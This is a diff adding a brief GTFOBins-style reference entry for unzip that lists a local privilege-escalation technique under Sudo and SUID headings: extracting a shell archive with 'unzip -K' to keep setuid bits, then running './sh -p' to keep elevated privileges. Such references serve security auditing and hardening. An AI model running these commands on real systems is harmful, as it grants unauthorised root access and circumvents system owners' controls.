@@ -1,0 +1,13 @@
+unzip
+=====
+
+Privilege Escalation
+--------------------
+
+[Sudo]
+    unzip -K shell.zip
+./sh -p
+
+[SUID]
+    unzip -K shell.zip
+./sh -p
